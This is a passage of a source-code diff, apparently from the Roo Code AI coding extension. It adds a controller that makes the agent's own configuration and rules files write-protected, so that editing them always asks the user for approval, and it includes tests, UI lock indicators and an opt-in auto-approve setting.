+	isWriteProtected(filePath: string): boolean {
+		try {
+			// Normalize path to be relative to cwd and use forward slashes
+			const absolutePath = path.resolve(this.cwd, filePath)
+			const relativePath = path.relative(this.cwd, absolutePath).toPosix()
+
+			// Use ignore library to check if file matches any protected pattern
+			return this.ignoreInstance.ignores(relativePath)
+		} catch (error) {
+			// If there's an error processing the path, err on the side of caution
+			// Ignore is designed to work with relative file paths, so will throw error for paths outside cwd
+			console.error(`Error checking protection for ${filePath}:`, error)
+			return false
+		}
+	}
+
+	/**
+	 * Get set of write-protected files from a list
+	 * @param paths - Array of paths to filter (relative to cwd)
+	 * @returns Set of protected file paths
+	 */
+	getProtectedFiles(paths: string[]): Set<string> {
+		const protectedFiles = new Set<string>()
+
+		for (const filePath of paths) {
+			if (this.isWriteProtected(filePath)) {
+				protectedFiles.add(filePath)
+			}
+		}
+
+		return protectedFiles
+	}
+
+	/**
+	 * Filter an array of paths, marking which ones are protected
+	 * @param paths - Array of paths to check (relative to cwd)
+	 * @returns Array of objects with path and protection status
+	 */
+	annotatePathsWithProtection(paths: string[]): Array<{ path: string; isProtected: boolean }> {
+		return paths.map((filePath) => ({
+			path: filePath,
+			isProtected: this.isWriteProtected(filePath),
+		}))
+	}
+
+	/**
+	 * Get display message for protected file operations
+	 */
+	getProtectionMessage(): string {
+		return "This is a Roo configuration file and requires approval for modifications"
+	}
+
+	/**
+	 * Get formatted instructions about protected files for the LLM
+	 * @returns Formatted instructions about file protection
+	 */
+	getInstructions(): string {
+		const patterns = RooProtectedController.PROTECTED_PATTERNS.join(", ")
+		return `# Protected Files\n\n(The following Roo configuration file patterns are write-protected and always require approval for modifications, regardless of autoapproval settings. When using list_files, you'll notice a ${SHIELD_SYMBOL} next to files that are write-protected.)\n\nProtected patterns: ${patterns}`
+	}
+
+	/**
+	 * Get the list of protected patterns (for testing/debugging)
+	 */
+	static getProtectedPatterns(): readonly string[] {
+		return RooProtectedController.PROTECTED_PATTERNS
+	}
+}
diff --git a/src/core/protect/__tests__/RooProtectedController.spec.ts b/src/core/protect/__tests__/RooProtectedController.spec.ts
new file mode 100644
index 000000000000..63d880928525
--- /dev/null
+++ b/src/core/protect/__tests__/RooProtectedController.spec.ts
@@ -0,0 +1,141 @@
+import path from "path"
+import { RooProtectedController } from "../RooProtectedController"
+
+describe("RooProtectedController", () => {
+	const TEST_CWD = "/test/workspace"
+	let controller: RooProtectedController
+
+	beforeEach(() => {
+		controller = new RooProtectedController(TEST_CWD)
+	})
+
+	describe("isWriteProtected", () => {
+		it("should protect .rooignore file", () => {
+			expect(controller.isWriteProtected(".rooignore")).toBe(true)
+		})
+
+		it("should protect files in .roo directory", () => {
+			expect(controller.isWriteProtected(".roo/config.json")).toBe(true)
+			expect(controller.isWriteProtected(".roo/settings/user.json")).toBe(true)
+			expect(controller.isWriteProtected(".roo/modes/custom.json")).toBe(true)
+		})
+
+		it("should protect .rooprotected file", () => {
+			expect(controller.isWriteProtected(".rooprotected")).toBe(true)
+		})
+
+		it("should protect .roomodes files", () => {
+			expect(controller.isWriteProtected(".roomodes")).toBe(true)
+		})
+
+		it("should protect .roorules* files", () => {
+			expect(controller.isWriteProtected(".roorules")).toBe(true)
+			expect(controller.isWriteProtected(".roorules.md")).toBe(true)
+		})
+
+		it("should protect .clinerules* files", () => {
+			expect(controller.isWriteProtected(".clinerules")).toBe(true)
+			expect(controller.isWriteProtected(".clinerules.md")).toBe(true)
+		})
+
+		it("should not protect other files starting with .roo", () => {
+			expect(controller.isWriteProtected(".roosettings")).toBe(false)
+			expect(controller.isWriteProtected(".rooconfig")).toBe(false)
+		})
+
+		it("should not protect regular files", () => {
+			expect(controller.isWriteProtected("src/index.ts")).toBe(false)
+			expect(controller.isWriteProtected("package.json")).toBe(false)
+			expect(controller.isWriteProtected("README.md")).toBe(false)
+		})
+
+		it("should not protect files that contain 'roo' but don't start with .roo", () => {
+			expect(controller.isWriteProtected("src/roo-utils.ts")).toBe(false)
+			expect(controller.isWriteProtected("config/roo.config.js")).toBe(false)
+		})
+
+		it("should handle nested paths correctly", () => {
+			expect(controller.isWriteProtected(".roo/config.json")).toBe(true) // .roo/** matches at root
+			expect(controller.isWriteProtected("nested/.rooignore")).toBe(true) // .rooignore matches anywhere by default
+			expect(controller.isWriteProtected("nested/.roomodes")).toBe(true) // .roomodes matches anywhere by default
+			expect(controller.isWriteProtected("nested/.roorules.md")).toBe(true) // .roorules* matches anywhere by default
+		})
+
+		it("should handle absolute paths by converting to relative", () => {
+			const absolutePath = path.join(TEST_CWD, ".rooignore")
+			expect(controller.isWriteProtected(absolutePath)).toBe(true)
+		})
+
+		it("should handle paths with different separators", () => {
+			expect(controller.isWriteProtected(".roo\\config.json")).toBe(true)
+			expect(controller.isWriteProtected(".roo/config.json")).toBe(true)
+		})
+	})
+
+	describe("getProtectedFiles", () => {
+		it("should return set of protected files from a list", () => {
+			const files = ["src/index.ts", ".rooignore", "package.json", ".roo/config.json", "README.md"]
+
+			const protectedFiles = controller.getProtectedFiles(files)
+
+			expect(protectedFiles).toEqual(new Set([".rooignore", ".roo/config.json"]))
+		})
+
+		it("should return empty set when no files are protected", () => {
+			const files = ["src/index.ts", "package.json", "README.md"]
+
+			const protectedFiles = controller.getProtectedFiles(files)
+
+			expect(protectedFiles).toEqual(new Set())
+		})
+	})
+
+	describe("annotatePathsWithProtection", () => {
+		it("should annotate paths with protection status", () => {
+			const files = ["src/index.ts", ".rooignore", ".roo/config.json", "package.json"]
+
+			const annotated = controller.annotatePathsWithProtection(files)
+
+			expect(annotated).toEqual([
+				{ path: "src/index.ts", isProtected: false },
+				{ path: ".rooignore", isProtected: true },
+				{ path: ".roo/config.json", isProtected: true },
+				{ path: "package.json", isProtected: false },
+			])
+		})
+	})
+
+	describe("getProtectionMessage", () => {
+		it("should return appropriate protection message", () => {
+			const message = controller.getProtectionMessage()
+			expect(message).toBe("This is a Roo configuration file and requires approval for modifications")
+		})
+	})
+
+	describe("getInstructions", () => {
+		it("should return formatted instructions about protected files", () => {
+			const instructions = controller.getInstructions()
+
+			expect(instructions).toContain("# Protected Files")
+			expect(instructions).toContain("write-protected")
+			expect(instructions).toContain(".rooignore")
+			expect(instructions).toContain(".roo/**")
+			expect(instructions).toContain("\u{1F6E1}") // Shield symbol
+		})
+	})
+
+	describe("getProtectedPatterns", () => {
+		it("should return the list of protected patterns", () => {
+			const patterns = RooProtectedController.getProtectedPatterns()
+
+			expect(patterns).toEqual([
+				".rooignore",
+				".roomodes",
+				".roorules*",
+				".clinerules*",
+				".roo/**",
+				".rooprotected",
+			])
+		})
+	})
+})
diff --git a/src/core/task/Task.ts b/src/core/task/Task.ts
index e881749e8632..a6a9d89986b8 100644
--- a/src/core/task/Task.ts
+++ b/src/core/task/Task.ts
@@ -65,6 +65,7 @@ import { SYSTEM_PROMPT } from "../prompts/system"
 import { ToolRepetitionDetector } from "../tools/ToolRepetitionDetector"
 import { FileContextTracker } from "../context-tracking/FileContextTracker"
 import { RooIgnoreController } from "../ignore/RooIgnoreController"
+import { RooProtectedController } from "../protect/RooProtectedController"
 import { type AssistantMessageContent, parseAssistantMessage, presentAssistantMessage } from "../assistant-message"
 import { truncateConversationIfNeeded } from "../sliding-window"
 import { ClineProvider } from "../webview/ClineProvider"
@@ -144,6 +145,7 @@ export class Task extends EventEmitter<ClineEvents> {
 
 	toolRepetitionDetector: ToolRepetitionDetector
 	rooIgnoreController?: RooIgnoreController
+	rooProtectedController?: RooProtectedController
 	fileContextTracker: FileContextTracker
 	urlContentFetcher: UrlContentFetcher
 	terminalProcess?: RooTerminalProcess
@@ -223,6 +225,7 @@ export class Task extends EventEmitter<ClineEvents> {
 		this.taskNumber = -1
 
 		this.rooIgnoreController = new RooIgnoreController(this.cwd)
+		this.rooProtectedController = new RooProtectedController(this.cwd)
 		this.fileContextTracker = new FileContextTracker(provider, this.taskId)
 
 		this.rooIgnoreController.initialize().catch((error) => {
@@ -406,6 +409,7 @@ export class Task extends EventEmitter<ClineEvents> {
 		text?: string,
 		partial?: boolean,
 		progressStatus?: ToolProgressStatus,
+		isProtected?: boolean,
 	): Promise<{ response: ClineAskResponse; text?: string; images?: string[] }> {
 		// If this Cline instance was aborted by the provider, then the only
 		// thing keeping us alive is a promise still running in the background,
@@ -433,6 +437,7 @@ export class Task extends EventEmitter<ClineEvents> {
 					lastMessage.text = text
 					lastMessage.partial = partial
 					lastMessage.progressStatus = progressStatus
+					lastMessage.isProtected = isProtected
 					// TODO: Be more efficient about saving and posting only new
 					// data or one whole message at a time so ignore partial for
 					// saves, and only post parts of partial message instead of
@@ -444,7 +449,7 @@ export class Task extends EventEmitter<ClineEvents> {
 					// state.
 					askTs = Date.now()
 					this.lastMessageTs = askTs
-					await this.addToClineMessages({ ts: askTs, type: "ask", ask: type, text, partial })
+					await this.addToClineMessages({ ts: askTs, type: "ask", ask: type, text, partial, isProtected })
 					throw new Error("Current ask promise was ignored (#2)")
 				}
 			} else {
@@ -471,6 +476,7 @@ export class Task extends EventEmitter<ClineEvents> {
 					lastMessage.text = text
 					lastMessage.partial = false
 					lastMessage.progressStatus = progressStatus
+					lastMessage.isProtected = isProtected
 					await this.saveClineMessages()
 					this.updateClineMessage(lastMessage)
 				} else {
@@ -480,7 +486,7 @@ export class Task extends EventEmitter<ClineEvents> {
 					this.askResponseImages = undefined
 					askTs = Date.now()
 					this.lastMessageTs = askTs
-					await this.addToClineMessages({ ts: askTs, type: "ask", ask: type, text })
+					await this.addToClineMessages({ ts: askTs, type: "ask", ask: type, text, isProtected })
 				}
 			}
 		} else {
@@ -490,7 +496,7 @@ export class Task extends EventEmitter<ClineEvents> {
 			this.askResponseImages = undefined
 			askTs = Date.now()
 			this.lastMessageTs = askTs
-			await this.addToClineMessages({ ts: askTs, type: "ask", ask: type, text })
+			await this.addToClineMessages({ ts: askTs, type: "ask", ask: type, text, isProtected })
 		}
 
 		await pWaitFor(() => this.askResponse !== undefined || this.lastMessageTs !== askTs, { interval: 100 })
diff --git a/src/core/tools/insertContentTool.ts b/src/core/tools/insertContentTool.ts
index 0963bc78cc63..af8d91713f1c 100644
--- a/src/core/tools/insertContentTool.ts
+++ b/src/core/tools/insertContentTool.ts
@@ -66,6 +66,9 @@ export async function insertContentTool(
 			return
 		}
 
+		// Check if file is write-protected
+		const isWriteProtected = cline.rooProtectedController?.isWriteProtected(relPath) || false
+
 		const absolutePath = path.resolve(cline.cwd, relPath)
 		const fileExists = await fileExistsAtPath(absolutePath)
 
@@ -124,10 +127,11 @@ export async function insertContentTool(
 			...sharedMessageProps,
 			diff,
 			lineNumber: lineNumber,
+			isProtected: isWriteProtected,
 		} satisfies ClineSayTool)
 
 		const didApprove = await cline
-			.ask("tool", completeMessage, false)
+			.ask("tool", completeMessage, isWriteProtected)
 			.then((response) => response.response === "yesButtonClicked")
 
 		if (!didApprove) {
diff --git a/src/core/tools/listFilesTool.ts b/src/core/tools/listFilesTool.ts
index 6d40de711c44..1fabca22c153 100644
--- a/src/core/tools/listFilesTool.ts
+++ b/src/core/tools/listFilesTool.ts
@@ -64,6 +64,7 @@ export async function listFilesTool(
 				didHitLimit,
 				cline.rooIgnoreController,
 				showRooIgnoredFiles,
+				cline.rooProtectedController,
 			)
 
 			const completeMessage = JSON.stringify({ ...sharedMessageProps, content: result } satisfies ClineSayTool)
diff --git a/src/core/tools/multiApplyDiffTool.ts b/src/core/tools/multiApplyDiffTool.ts
index ba36cd37599c..8a75d58c5adb 100644
--- a/src/core/tools/multiApplyDiffTool.ts
+++ b/src/core/tools/multiApplyDiffTool.ts
@@ -161,7 +161,6 @@ Expected structure:
 Original error: ${errorMessage}`
 			throw new Error(detailedError)
 		}
-
 	} else if (legacyPath && typeof legacyDiffContent === "string") {
 		// Handle legacy parameters (old way)
 		usingLegacyParams = true
@@ -236,6 +235,9 @@ Original error: ${errorMessage}`
 				continue
 			}
 
+			// Check if file is write-protected
+			const isWriteProtected = cline.rooProtectedController?.isWriteProtected(relPath) || false
+
 			// Verify file exists
 			const absolutePath = path.resolve(cline.cwd, relPath)
 			const fileExists = await fileExistsAtPath(absolutePath)
@@ -258,6 +260,11 @@ Original error: ${errorMessage}`
 
 		// Handle batch approval if there are multiple files
 		if (operationsToApprove.length > 1) {
+			// Check if any files are write-protected
+			const hasProtectedFiles = operationsToApprove.some(
+				(opResult) => cline.rooProtectedController?.isWriteProtected(opResult.path) || false,
+			)
+
 			// Prepare batch diff data
 			const batchDiffs = operationsToApprove.map((opResult) => {
 				const readablePath = getReadablePath(cline.cwd, opResult.path)
@@ -279,9 +286,10 @@ Original error: ${errorMessage}`
 			const completeMessage = JSON.stringify({
 				tool: "appliedDiff",
 				batchDiffs,
+				isProtected: hasProtectedFiles,
 			} satisfies ClineSayTool)
 
-			const { response, text, images } = await cline.ask("tool", completeMessage, false)
+			const { response, text, images } = await cline.ask("tool", completeMessage, hasProtectedFiles)
 
 			// Process batch response
 			if (response === "yesButtonClicked") {
@@ -485,9 +493,11 @@ ${errorDetails ? `\nTechnical details:\n${errorDetails}\n` : ""}
 				await cline.diffViewProvider.scrollToFirstDiff()
 
 				// For batch operations, we've already gotten approval
+				const isWriteProtected = cline.rooProtectedController?.isWriteProtected(relPath) || false
 				const sharedMessageProps: ClineSayTool = {
 					tool: "appliedDiff",
 					path: getReadablePath(cline.cwd, relPath),
+					isProtected: isWriteProtected,
 				}
 
 				// If single file, ask for approval
@@ -511,7 +521,9 @@ ${errorDetails ? `\nTechnical details:\n${errorDetails}\n` : ""}
 						)
 					}
 
-					didApprove = await askApproval("tool", operationMessage, toolProgressStatus)
+					// Check if file is write-protected
+					const isWriteProtected = cline.rooProtectedController?.isWriteProtected(relPath) || false
+					didApprove = await askApproval("tool", operationMessage, toolProgressStatus, isWriteProtected)
 				}
 
 				if (!didApprove) {
diff --git a/src/core/tools/searchAndReplaceTool.ts b/src/core/tools/searchAndReplaceTool.ts
index 58d246b1337d..967d5339bade 100644
--- a/src/core/tools/searchAndReplaceTool.ts
+++ b/src/core/tools/searchAndReplaceTool.ts
@@ -123,6 +123,9 @@ export async function searchAndReplaceTool(
 			return
 		}
 
+		// Check if file is write-protected
+		const isWriteProtected = cline.rooProtectedController?.isWriteProtected(validRelPath) || false
+
 		const absolutePath = path.resolve(cline.cwd, validRelPath)
 		const fileExists = await fileExistsAtPath(absolutePath)
 
@@ -207,9 +210,13 @@ export async function searchAndReplaceTool(
 		await cline.diffViewProvider.update(newContent, true)
 
 		// Request user approval for changes
-		const completeMessage = JSON.stringify({ ...sharedMessageProps, diff } satisfies ClineSayTool)
+		const completeMessage = JSON.stringify({
+			...sharedMessageProps,
+			diff,
+			isProtected: isWriteProtected,
+		} satisfies ClineSayTool)
 		const didApprove = await cline
-			.ask("tool", completeMessage, false)
+			.ask("tool", completeMessage, isWriteProtected)
 			.then((response) => response.response === "yesButtonClicked")
 
 		if (!didApprove) {
diff --git a/src/core/tools/writeToFileTool.ts b/src/core/tools/writeToFileTool.ts
index f7543d6d8b74..d4469e9099c0 100644
--- a/src/core/tools/writeToFileTool.ts
+++ b/src/core/tools/writeToFileTool.ts
@@ -56,6 +56,9 @@ export async function writeToFileTool(
 		return
 	}
 
+	// Check if file is write-protected
+	const isWriteProtected = cline.rooProtectedController?.isWriteProtected(relPath) || false
+
 	// Check if file exists using cached map or fs.access
 	let fileExists: boolean
 
@@ -90,6 +93,7 @@ export async function writeToFileTool(
 		path: getReadablePath(cline.cwd, removeClosingTag("path", relPath)),
 		content: newContent,
 		isOutsideWorkspace,
+		isProtected: isWriteProtected,
 	}
 
 	try {
@@ -201,7 +205,7 @@ export async function writeToFileTool(
 					: undefined,
 			} satisfies ClineSayTool)
 
-			const didApprove = await askApproval("tool", completeMessage)
+			const didApprove = await askApproval("tool", completeMessage, undefined, isWriteProtected)
 
 			if (!didApprove) {
 				await cline.diffViewProvider.revertChanges()
diff --git a/src/core/webview/ClineProvider.ts b/src/core/webview/ClineProvider.ts
index 9d4114825d7f..57fa16a8487e 100644
--- a/src/core/webview/ClineProvider.ts
+++ b/src/core/webview/ClineProvider.ts
@@ -1276,6 +1276,7 @@ export class ClineProvider
 			alwaysAllowReadOnlyOutsideWorkspace,
 			alwaysAllowWrite,
 			alwaysAllowWriteOutsideWorkspace,
+			alwaysAllowWriteProtected,
 			alwaysAllowExecute,
 			alwaysAllowBrowser,
 			alwaysAllowMcp,
@@ -1369,6 +1370,7 @@ export class ClineProvider
 			alwaysAllowReadOnlyOutsideWorkspace: alwaysAllowReadOnlyOutsideWorkspace ?? false,
 			alwaysAllowWrite: alwaysAllowWrite ?? false,
 			alwaysAllowWriteOutsideWorkspace: alwaysAllowWriteOutsideWorkspace ?? false,
+			alwaysAllowWriteProtected: alwaysAllowWriteProtected ?? false,
 			alwaysAllowExecute: alwaysAllowExecute ?? false,
 			alwaysAllowBrowser: alwaysAllowBrowser ?? false,
 			alwaysAllowMcp: alwaysAllowMcp ?? false,
@@ -1529,6 +1531,7 @@ export class ClineProvider
 			alwaysAllowReadOnlyOutsideWorkspace: stateValues.alwaysAllowReadOnlyOutsideWorkspace ?? false,
 			alwaysAllowWrite: stateValues.alwaysAllowWrite ?? false,
 			alwaysAllowWriteOutsideWorkspace: stateValues.alwaysAllowWriteOutsideWorkspace ?? false,
+			alwaysAllowWriteProtected: stateValues.alwaysAllowWriteProtected ?? false,
 			alwaysAllowExecute: stateValues.alwaysAllowExecute ?? false,
 			alwaysAllowBrowser: stateValues.alwaysAllowBrowser ?? false,
 			alwaysAllowMcp: stateValues.alwaysAllowMcp ?? false,
diff --git a/src/core/webview/webviewMessageHandler.ts b/src/core/webview/webviewMessageHandler.ts
index a60c5fea41e4..673f1bc17bf4 100644
--- a/src/core/webview/webviewMessageHandler.ts
+++ b/src/core/webview/webviewMessageHandler.ts
@@ -155,6 +155,10 @@ export const webviewMessageHandler = async (
 			await updateGlobalState("alwaysAllowWriteOutsideWorkspace", message.bool ?? undefined)
 			await provider.postStateToWebview()
 			break
+		case "alwaysAllowWriteProtected":
+			await updateGlobalState("alwaysAllowWriteProtected", message.bool ?? undefined)
+			await provider.postStateToWebview()
+			break
 		case "alwaysAllowExecute":
 			await updateGlobalState("alwaysAllowExecute", message.bool ?? undefined)
 			await provider.postStateToWebview()
diff --git a/src/shared/ExtensionMessage.ts b/src/shared/ExtensionMessage.ts
index 3f6333dc37ae..921a45796521 100644
--- a/src/shared/ExtensionMessage.ts
+++ b/src/shared/ExtensionMessage.ts
@@ -151,6 +151,7 @@ export type ExtensionState = Pick<
 	| "alwaysAllowReadOnlyOutsideWorkspace"
 	| "alwaysAllowWrite"
 	| "alwaysAllowWriteOutsideWorkspace"
+	| "alwaysAllowWriteProtected"
 	// | "writeDelayMs" // Optional in GlobalSettings, required here.
 	| "alwaysAllowBrowser"
 	| "alwaysApproveResubmit"
@@ -276,6 +277,7 @@ export interface ClineSayTool {
 	mode?: string
 	reason?: string
 	isOutsideWorkspace?: boolean
+	isProtected?: boolean
 	additionalFileCount?: number // Number of additional files in the same read_file request
 	search?: string
 	replace?: string
diff --git a/src/shared/WebviewMessage.ts b/src/shared/WebviewMessage.ts
index ae93e3ae760b..26d7f7a53697 100644
--- a/src/shared/WebviewMessage.ts
+++ b/src/shared/WebviewMessage.ts
@@ -29,6 +29,7 @@ export interface WebviewMessage {
 		| "alwaysAllowReadOnlyOutsideWorkspace"
 		| "alwaysAllowWrite"
 		| "alwaysAllowWriteOutsideWorkspace"
+		| "alwaysAllowWriteProtected"
 		| "alwaysAllowExecute"
 		| "webviewDidLaunch"
 		| "newTask"
diff --git a/src/shared/tools.ts b/src/shared/tools.ts
index ffaf41f93f7a..98a1be3ef2f3 100644
--- a/src/shared/tools.ts
+++ b/src/shared/tools.ts
@@ -8,6 +8,7 @@ export type AskApproval = (
 	type: ClineAsk,
 	partialMessage?: string,
 	progressStatus?: ToolProgressStatus,
+	forceApproval?: boolean,
 ) => Promise<boolean>
 
 export type HandleError = (action: string, error: Error) => Promise<void>
diff --git a/webview-ui/src/components/chat/ChatRow.tsx b/webview-ui/src/components/chat/ChatRow.tsx
index e71b05be50f3..eaf5ead616a4 100644
--- a/webview-ui/src/components/chat/ChatRow.tsx
+++ b/webview-ui/src/components/chat/ChatRow.tsx
@@ -313,11 +313,20 @@ export const ChatRowContent = ({
 				return (
 					<>
 						<div style={headerStyle}>
-							{toolIcon(tool.tool === "appliedDiff" ? "diff" : "edit")}
+							{tool.isProtected ? (
+								<span
+									className="codicon codicon-lock"
+									style={{ color: "var(--vscode-editorWarning-foreground)", marginBottom: "-1.5px" }}
+								/>
+							) : (
+								toolIcon(tool.tool === "appliedDiff" ? "diff" : "edit")
+							)}
 							<span style={{ fontWeight: "bold" }}>
-								{tool.isOutsideWorkspace
-									? t("chat:fileOperations.wantsToEditOutsideWorkspace")
-									: t("chat:fileOperations.wantsToEdit")}
+								{tool.isProtected
+									? t("chat:fileOperations.wantsToEditProtected")
+									: tool.isOutsideWorkspace
+										? t("chat:fileOperations.wantsToEditOutsideWorkspace")
+										: t("chat:fileOperations.wantsToEdit")}
 							</span>
 						</div>
 						<CodeAccordian
@@ -335,15 +344,24 @@ export const ChatRowContent = ({
 				return (
 					<>
 						<div style={headerStyle}>
-							{toolIcon("insert")}
+							{tool.isProtected ? (
+								<span
+									className="codicon codicon-lock"
+									style={{ color: "var(--vscode-editorWarning-foreground)", marginBottom: "-1.5px" }}
+								/>
+							) : (
+								toolIcon("insert")
+							)}
 							<span style={{ fontWeight: "bold" }}>
-								{tool.isOutsideWorkspace
-									? t("chat:fileOperations.wantsToEditOutsideWorkspace")
-									: tool.lineNumber === 0
-										? t("chat:fileOperations.wantsToInsertAtEnd")
-										: t("chat:fileOperations.wantsToInsertWithLineNumber", {
-												lineNumber: tool.lineNumber,
-											})}
+								{tool.isProtected
+									? t("chat:fileOperations.wantsToEditProtected")
+									: tool.isOutsideWorkspace
+										? t("chat:fileOperations.wantsToEditOutsideWorkspace")
+										: tool.lineNumber === 0
+											? t("chat:fileOperations.wantsToInsertAtEnd")
+											: t("chat:fileOperations.wantsToInsertWithLineNumber", {
+													lineNumber: tool.lineNumber,
+												})}
 							</span>
 						</div>
 						<CodeAccordian
@@ -361,11 +379,20 @@ export const ChatRowContent = ({
 				return (
 					<>
 						<div style={headerStyle}>
-							{toolIcon("replace")}
+							{tool.isProtected ? (
+								<span
+									className="codicon codicon-lock"
+									style={{ color: "var(--vscode-editorWarning-foreground)", marginBottom: "-1.5px" }}
+								/>
+							) : (
+								toolIcon("replace")
+							)}
 							<span style={{ fontWeight: "bold" }}>
-								{message.type === "ask"
-									? t("chat:fileOperations.wantsToSearchReplace")
-									: t("chat:fileOperations.didSearchReplace")}
+								{tool.isProtected && message.type === "ask"
+									? t("chat:fileOperations.wantsToEditProtected")
+									: message.type === "ask"
+										? t("chat:fileOperations.wantsToSearchReplace")
+										: t("chat:fileOperations.didSearchReplace")}
 							</span>
 						</div>
 						<CodeAccordian
@@ -405,8 +432,19 @@ export const ChatRowContent = ({
 				return (
 					<>
 						<div style={headerStyle}>
-							{toolIcon("new-file")}
-							<span style={{ fontWeight: "bold" }}>{t("chat:fileOperations.wantsToCreate")}</span>
+							{tool.isProtected ? (
+								<span
+									className="codicon codicon-lock"
+									style={{ color: "var(--vscode-editorWarning-foreground)", marginBottom: "-1.5px" }}
+								/>
+							) : (
+								toolIcon("new-file")
+							)}
+							<span style={{ fontWeight: "bold" }}>
+								{tool.isProtected
+									? t("chat:fileOperations.wantsToEditProtected")
+									: t("chat:fileOperations.wantsToCreate")}
+							</span>
 						</div>
 						<CodeAccordian
 							path={tool.path}
diff --git a/webview-ui/src/components/chat/ChatView.tsx b/webview-ui/src/components/chat/ChatView.tsx
index 52a3026e8ad3..90901c84e90a 100644
--- a/webview-ui/src/components/chat/ChatView.tsx
+++ b/webview-ui/src/components/chat/ChatView.tsx
@@ -79,6 +79,7 @@ const ChatViewComponent: React.ForwardRefRenderFunction<ChatViewRef, ChatViewPro
 		alwaysAllowReadOnlyOutsideWorkspace,
 		alwaysAllowWrite,
 		alwaysAllowWriteOutsideWorkspace,
+		alwaysAllowWriteProtected,
 		alwaysAllowExecute,
 		alwaysAllowMcp,
 		allowedCommands,
@@ -914,13 +915,18 @@ const ChatViewComponent: React.ForwardRefRenderFunction<ChatViewRef, ChatViewPro
 				}
 
 				const isOutsideWorkspace = !!tool.isOutsideWorkspace
+				const isProtected = message.isProtected
 
 				if (isReadOnlyToolAction(message)) {
 					return alwaysAllowReadOnly && (!isOutsideWorkspace || alwaysAllowReadOnlyOutsideWorkspace)
 				}
 
 				if (isWriteToolAction(message)) {
-					return alwaysAllowWrite && (!isOutsideWorkspace || alwaysAllowWriteOutsideWorkspace)
+					return (
+						alwaysAllowWrite &&
+						(!isOutsideWorkspace || alwaysAllowWriteOutsideWorkspace) &&
+						(!isProtected || alwaysAllowWriteProtected)
+					)
 				}
 			}
 
@@ -934,6 +940,7 @@ const ChatViewComponent: React.ForwardRefRenderFunction<ChatViewRef, ChatViewPro
 			isReadOnlyToolAction,
 			alwaysAllowWrite,
 			alwaysAllowWriteOutsideWorkspace,
+			alwaysAllowWriteProtected,
 			isWriteToolAction,
 			alwaysAllowExecute,
 			isAllowedCommand,
diff --git a/webview-ui/src/components/settings/AutoApproveSettings.tsx b/webview-ui/src/components/settings/AutoApproveSettings.tsx
index 4f44ada43ccf..e825ab8d7c98 100644
--- a/webview-ui/src/components/settings/AutoApproveSettings.tsx
+++ b/webview-ui/src/components/settings/AutoApproveSettings.tsx
@@ -16,6 +16,7 @@ type AutoApproveSettingsProps = HTMLAttributes<HTMLDivElement> & {
 	alwaysAllowReadOnlyOutsideWorkspace?: boolean
 	alwaysAllowWrite?: boolean
 	alwaysAllowWriteOutsideWorkspace?: boolean
+	alwaysAllowWriteProtected?: boolean
 	writeDelayMs: number
 	alwaysAllowBrowser?: boolean
 	alwaysApproveResubmit?: boolean
@@ -30,6 +31,7 @@ type AutoApproveSettingsProps = HTMLAttributes<HTMLDivElement> & {
 		| "alwaysAllowReadOnlyOutsideWorkspace"
 		| "alwaysAllowWrite"
 		| "alwaysAllowWriteOutsideWorkspace"
+		| "alwaysAllowWriteProtected"
 		| "writeDelayMs"
 		| "alwaysAllowBrowser"
 		| "alwaysApproveResubmit"
@@ -47,6 +49,7 @@ export const AutoApproveSettings = ({
 	alwaysAllowReadOnlyOutsideWorkspace,
 	alwaysAllowWrite,
 	alwaysAllowWriteOutsideWorkspace,
+	alwaysAllowWriteProtected,
 	writeDelayMs,
 	alwaysAllowBrowser,
 	alwaysApproveResubmit,
@@ -138,10 +141,23 @@ export const AutoApproveSettings = ({
 									{t("settings:autoApprove.write.outsideWorkspace.label")}
 								</span>
 							</VSCodeCheckbox>
-							<div className="text-vscode-descriptionForeground text-sm mt-1 mb-3">
+							<div className="text-vscode-descriptionForeground text-sm mt-1">
 								{t("settings:autoApprove.write.outsideWorkspace.description")}
 							</div>
 						</div>
+						<div>
+							<VSCodeCheckbox
+								checked={alwaysAllowWriteProtected}
+								onChange={(e: any) =>
+									setCachedStateField("alwaysAllowWriteProtected", e.target.checked)
+								}
+								data-testid="always-allow-write-protected-checkbox">
+								<span className="font-medium">{t("settings:autoApprove.write.protected.label")}</span>
+							</VSCodeCheckbox>
+							<div className="text-vscode-descriptionForeground text-sm mt-1 mb-3">
+								{t("settings:autoApprove.write.protected.description")}
+							</div>
+						</div>
 						<div>
 							<div className="flex items-center gap-2">
 								<Slider
diff --git a/webview-ui/src/components/settings/SettingsView.tsx b/webview-ui/src/components/settings/SettingsView.tsx
index 45ea5f06646e..aea9457994d4 100644
--- a/webview-ui/src/components/settings/SettingsView.tsx
+++ b/webview-ui/src/components/settings/SettingsView.tsx
@@ -131,6 +131,7 @@ const SettingsView = forwardRef<SettingsViewRef, SettingsViewProps>(({ onDone, t
 		alwaysAllowSubtasks,
 		alwaysAllowWrite,
 		alwaysAllowWriteOutsideWorkspace,
+		alwaysAllowWriteProtected,
 		alwaysApproveResubmit,
 		autoCondenseContext,
 		autoCondenseContextPercent,
@@ -253,6 +254,7 @@ const SettingsView = forwardRef<SettingsViewRef, SettingsViewProps>(({ onDone, t
 			})
 			vscode.postMessage({ type: "alwaysAllowWrite", bool: alwaysAllowWrite })
 			vscode.postMessage({ type: "alwaysAllowWriteOutsideWorkspace", bool: alwaysAllowWriteOutsideWorkspace })
+			vscode.postMessage({ type: "alwaysAllowWriteProtected", bool: alwaysAllowWriteProtected })
 			vscode.postMessage({ type: "alwaysAllowExecute", bool: alwaysAllowExecute })
 			vscode.postMessage({ type: "alwaysAllowBrowser", bool: alwaysAllowBrowser })
 			vscode.postMessage({ type: "alwaysAllowMcp", bool: alwaysAllowMcp })
@@ -571,6 +573,7 @@ const SettingsView = forwardRef<SettingsViewRef, SettingsViewProps>(({ onDone, t
 							alwaysAllowReadOnlyOutsideWorkspace={alwaysAllowReadOnlyOutsideWorkspace}
 							alwaysAllowWrite={alwaysAllowWrite}
 							alwaysAllowWriteOutsideWorkspace={alwaysAllowWriteOutsideWorkspace}
+							alwaysAllowWriteProtected={alwaysAllowWriteProtected}
 							writeDelayMs={writeDelayMs}
 							alwaysAllowBrowser={alwaysAllowBrowser}
 							alwaysApproveResubmit={alwaysApproveResubmit}
diff --git a/webview-ui/src/i18n/locales/ca/chat.json b/webview-ui/src/i18n/locales/ca/chat.json
index 372ae066f9cf..1ca901cfa752 100644
--- a/webview-ui/src/i18n/locales/ca/chat.json
+++ b/webview-ui/src/i18n/locales/ca/chat.json
@@ -145,6 +145,7 @@
 		"didRead": "Roo ha llegit aquest fitxer:",
 		"wantsToEdit": "Roo vol editar aquest fitxer:",
